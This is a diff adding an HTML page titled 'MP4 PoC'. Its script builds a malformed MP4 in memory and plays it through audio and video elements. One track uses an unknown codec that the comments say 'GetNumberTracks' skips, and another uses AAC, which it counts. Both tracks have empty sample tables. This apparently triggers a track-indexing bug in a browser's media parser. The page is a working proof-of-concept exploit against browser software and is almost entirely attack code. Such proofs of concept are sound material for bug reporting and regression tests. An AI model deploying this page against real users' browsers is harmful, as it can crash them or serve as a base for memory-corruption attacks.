@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>MP4 PoC</title></head>
+<body>
+<script>
+function h(s) {
+    const a = new Uint8Array(s.length / 2);
+    for (let i = 0; i < s.length; i += 2) a[i/2] = parseInt(s.substr(i, 2), 16);
+    return a;
+}
+function box(type, ...payloads) {
+    let size = 8;
+    for (const p of payloads) size += p.byteLength;
+    const buf = new Uint8Array(size);
+    new DataView(buf.buffer).setUint32(0, size);
+    for (let i = 0; i < 4; i++) buf[4 + i] = type.charCodeAt(i);
+    let offset = 8;
+    for (const p of payloads) { buf.set(p, offset); offset += p.byteLength; }
+    return buf;
+}
+function fullbox(type, ver, flags, ...p) {
+    const vf = new Uint8Array(4);
+    new DataView(vf.buffer).setUint32(0, (ver << 24) | flags);
+    return box(type, vf, ...p);
+}
+function u32(v) { const b = new Uint8Array(4); new DataView(b.buffer).setUint32(0, v); return b; }
+function u16(v) { const b = new Uint8Array(2); new DataView(b.buffer).setUint16(0, v); return b; }
+function u8(v) { return new Uint8Array([v]); }
+function zeros(n) { return new Uint8Array(n); }
+function concat(...a) {
+    let l = 0; for (const x of a) l += x.byteLength;
+    const o = new Uint8Array(l); let off = 0;
+    for (const x of a) { o.set(x, off); off += x.byteLength; }
+    return o;
+}
+function desc(tag, data) { return concat(u8(tag), u8(data.length), data); }
+
+function makeTrack(id, handler, objType) {
+    // tkhd
+    const tkhd = fullbox('tkhd', 0, 3, u32(0), u32(0), u32(id), u32(0), u32(48000),
+        zeros(8), u16(0), u16(0), u16(handler === 'soun' ? 0x0100 : 0), zeros(2),
+        u32(0x00010000), u32(0), u32(0), u32(0), u32(0x00010000), u32(0),
+        u32(0), u32(0), u32(0x40000000), u32(0), u32(0));
+    // mdhd
+    const mdhd = fullbox('mdhd', 0, 0, u32(0), u32(0), u32(48000), u32(48000), u16(0x55C4), u16(0));
+    // hdlr
+    const hdlrType = new Uint8Array(4);
+    for (let i = 0; i < 4; i++) hdlrType[i] = handler.charCodeAt(i);
+    const hdlr = fullbox('hdlr', 0, 0, u32(0), hdlrType, zeros(12), u8(0));
+    
+    // ESDS
+    const asc = new Uint8Array([0x11, 0x90]); // AOT=2, freq=48000, ch=2
+    const dsi = desc(5, asc);
+    const dc = concat(u8(objType), u8(0x15), h('000000'), u32(128000), u32(128000), dsi);
+    const sl = desc(6, u8(0x02));
+    const esds = fullbox('esds', 0, 0, desc(3, concat(u16(id), u8(0), desc(4, dc), sl)));
+    
+    // mp4a sample entry
+    const mp4a = box('mp4a', concat(zeros(6), u16(1), zeros(8), u16(2), u16(16), u16(0), u16(0), u32(48000 << 16), esds));
+    const stsd = fullbox('stsd', 0, 0, u32(1), mp4a);
+    
+    // Empty sample table (no actual samples)
+    const stts = fullbox('stts', 0, 0, u32(0));
+    const stsc = fullbox('stsc', 0, 0, u32(0));
+    const stsz = fullbox('stsz', 0, 0, u32(0), u32(0));
+    const stco = fullbox('stco', 0, 0, u32(0));
+    
+    const stbl = box('stbl', stsd, stts, stsc, stsz, stco);
+    const smhd = fullbox('smhd', 0, 0, u16(0), u16(0));
+    const dinf = box('dinf', fullbox('dref', 0, 0, u32(1), fullbox('url ', 0, 1)));
+    const minf = box('minf', smhd, dinf, stbl);
+    const mdia = box('mdia', mdhd, hdlr, minf);
+    return box('trak', tkhd, mdia);
+}
+
+const ftyp = box('ftyp', h('69736F6D'), u32(0x200), h('69736F6D69736F326D703431'));
+const mvhd = fullbox('mvhd', 0, 0, u32(0), u32(0), u32(48000), u32(48000),
+    u32(0x00010000), u16(0x0100), zeros(10),
+    u32(0x00010000), u32(0), u32(0), u32(0), u32(0x00010000), u32(0),
+    u32(0), u32(0), u32(0x40000000), zeros(24), u32(3));
+
+const track1 = makeTrack(1, 'soun', 0xC0); // Unknown codec - SKIPPED by GetNumberTracks
+const track2 = makeTrack(2, 'soun', 0x40); // AAC - COUNTED by GetNumberTracks
+
+const moov = box('moov', mvhd, track1, track2);
+const mp4 = concat(ftyp, moov);
+
+const blob = new Blob([mp4], { type: 'audio/mp4' });
+const url = URL.createObjectURL(blob);
+
+// Try loading through audio element
+const a = document.createElement('audio');
+a.src = url;
+document.body.appendChild(a);
+a.play().catch(()=>{});
+
+// Also try with video element  
+const v = document.createElement('video');
+v.src = url;
+v.muted = true;
+document.body.appendChild(v);
+v.play().catch(()=>{});
+</script>
+</body>
+</html>
